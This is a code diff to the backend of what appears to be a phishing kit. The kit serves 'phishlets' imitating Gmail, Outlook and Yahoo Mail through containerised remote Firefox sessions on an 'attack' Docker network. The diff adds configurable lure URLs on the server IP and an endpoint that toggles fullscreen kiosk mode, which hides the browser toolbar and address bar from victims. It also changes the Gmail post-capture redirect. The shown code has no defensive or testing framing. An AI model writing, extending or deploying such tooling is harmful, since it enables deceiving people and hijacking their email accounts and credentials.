@@ -31,6 +31,8 @@ FIREFOX_VNC_PORT = os.getenv("FIREFOX_VNC_PORT", "5900")
 SKIP_FIREFOX_BUILD = os.getenv("SKIP_FIREFOX_BUILD", "").lower() in {"1", "true", "yes"}
 FF_KIOSK_DEFAULT = os.getenv("FF_KIOSK_DEFAULT", "1")
 ALLOW_REGISTER = os.getenv("ALLOW_REGISTER", "true").lower() in {"1", "true", "yes"}
+PHISHLET_BIND = os.getenv("PHISHLET_BIND", "127.0.0.1")
+PHISHLET_URL_PREFIX = os.getenv("PHISHLET_URL_PREFIX", "path")
 
 LOG_FILE = "commands.log"
 BACKEND_DIR = Path(__file__).resolve().parent
@@ -55,7 +57,7 @@ app.add_middleware(
 app.include_router(auth_router)
 
 PHISHLETS = {
-    "gmail": {"label": "Gmail", "url": "https://gmail.com", "port": 5801, "redirect_url": "https://web.whatsapp.com"},
+    "gmail": {"label": "Gmail", "url": "https://gmail.com", "port": 5801, "redirect_url": ""},
     "outlook": {"label": "Outlook", "url": "https://outlook.com", "port": 5802, "redirect_url": ""},
     "yahoo": {"label": "Yahoo Mail", "url": "https://mail.yahoo.com", "port": 5803, "redirect_url": ""},
 }
@@ -98,6 +100,18 @@ def validate_container_name(name: str) -> str:
     if not CONTAINER_NAME_RE.fullmatch(name):
         raise HTTPException(status_code=400, detail="Invalid container name")
     return name
+
+
+def phishlet_port_arg(port: int) -> str:
+    if PHISHLET_BIND and PHISHLET_BIND != "0.0.0.0":
+        return f"{PHISHLET_BIND}:{port}:5800"
+    return f"{port}:5800"
+
+
+def phishlet_url(key: str, port: int) -> str:
+    if PHISHLET_URL_PREFIX == "port":
+        return f"http://{VPS_IP}:{port}"
+    return f"http://{VPS_IP}/{key}/"
 
 
 async def run_command(
@@ -265,6 +279,11 @@ async def list_phishlets(email: str = Depends(get_current_user)):
     async for doc in db.phishlet_settings.find({"pause_url": {"$exists": True, "$ne": ""}}, {"key": 1}):
         paused_keys.add(doc.get("key"))
 
+    kiosk_settings = {}
+    async for doc in db.phishlet_settings.find({}, {"key": 1, "kiosk": 1}):
+        if "kiosk" in doc:
+            kiosk_settings[doc["key"]] = doc["kiosk"]
+
     phishlets = []
     for key, cfg in PHISHLETS.items():
         name = f"phishlet-{key}"
@@ -277,6 +296,7 @@ async def list_phishlets(email: str = Depends(get_current_user)):
             "port": cfg["port"],
             "running": running_container is not None,
             "paused": key in paused_keys,
+            "kiosk": kiosk_settings.get(key, True),
             "container_id": running_container["id"] if running_container else "",
             "status": running_container["status"] if running_container else "",
         })
@@ -296,7 +316,7 @@ async def launch_phishlet(body: PhishletLaunchRequest, email: str = Depends(get_
     result = await run_docker([
         "run", "-d", "--name", container_name, "--shm-size=2g",
         "--network", "btb_attack_default",
-        "-p", f"{phishlet['port']}:5800",
+        "-p", phishlet_port_arg(phishlet['port']),
         "-e", f"FF_OPEN_URL={phishlet['url']}",
         "-e", f"FF_KIOSK={FF_KIOSK_DEFAULT}",
         "-e", f"REDIRECT_URL={redirect_url}",
@@ -307,7 +327,7 @@ async def launch_phishlet(body: PhishletLaunchRequest, email: str = Depends(get_
         cid = result["message"][:12]
         result["message"] += (
             f"\n\n  {phishlet['label']} phishlet running!\n"
-            f"  '- UI -> http://{VPS_IP}:{phishlet['port']}\n"
+            f"  '- UI -> {phishlet_url(body.key, phishlet['port'])}\n"
             f"\n  Container ID: {cid}"
         )
     return result
@@ -460,6 +480,58 @@ async def unpause_phishlet(key: str, email: str = Depends(get_current_user)):
     return {"paused": False, "key": key, "redirect_url": original_url}
 
 
+@app.post("/api/phishlets/{key}/toggle-kiosk")
+async def toggle_kiosk(key: str, email: str = Depends(get_current_user)):
+    if key not in PHISHLETS:
+        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
+
+    container_name = f"phishlet-{key}"
+
+    doc = await db.phishlet_settings.find_one({"key": key})
+    current_kiosk = (doc.get("kiosk", True) if doc else True)
+    new_kiosk = not current_kiosk
+
+    phishlet = PHISHLETS[key]
+    redirect_url = phishlet.get("redirect_url", "") or ""
+
+    await run_docker(["rm", "-f", container_name])
+
+    result = await run_docker([
+        "run", "-d", "--name", container_name, "--shm-size=2g",
+        "--network", "btb_attack_default",
+        "-p", phishlet_port_arg(phishlet['port']),
+        "-e", f"FF_OPEN_URL={phishlet['url']}",
+        "-e", f"FF_KIOSK={'1' if new_kiosk else '0'}",
+        "-e", f"REDIRECT_URL={redirect_url}",
+        "-v", f"{container_name}-config:/config",
+        CUSTOM_FIREFOX_IMAGE,
+    ])
+
+    await db.phishlet_settings.update_one(
+        {"key": key},
+        {"$set": {
+            "key": key,
+            "kiosk": new_kiosk,
+            "updated_at": datetime.now(timezone.utc),
+            "updated_by": email,
+        }},
+        upsert=True,
+    )
+
+    logger.info("%s toggled kiosk for %s: %s -> %s", email, key, current_kiosk, new_kiosk)
+
+    if result["status"] == "success":
+        cid = result["message"][:12]
+        mode = "ON (fullscreen)" if new_kiosk else "OFF (toolbar visible)"
+        result["message"] = (
+            f"[OK] Kiosk mode {mode}\n"
+            f"\n  {phishlet['label']} restarted!\n"
+            f"  '- UI -> {phishlet_url(key, phishlet['port'])}\n"
+            f"\n  Container ID: {cid}"
+        )
+    return result
+
+
 @app.post("/api/phishlets/rebuild-image")
 async def rebuild_image(email: str = Depends(get_current_user)):
     dockerfile = str(BACKEND_DIR / "Dockerfile.firefox")
@@ -563,7 +635,7 @@ async def health():
 
 @app.get("/api/config")
 async def config():
-    return {"allowRegister": ALLOW_REGISTER}
+    return {"allowRegister": ALLOW_REGISTER, "phishletUrlPrefix": PHISHLET_URL_PREFIX}
 
 
 @app.get("/api/proxy")
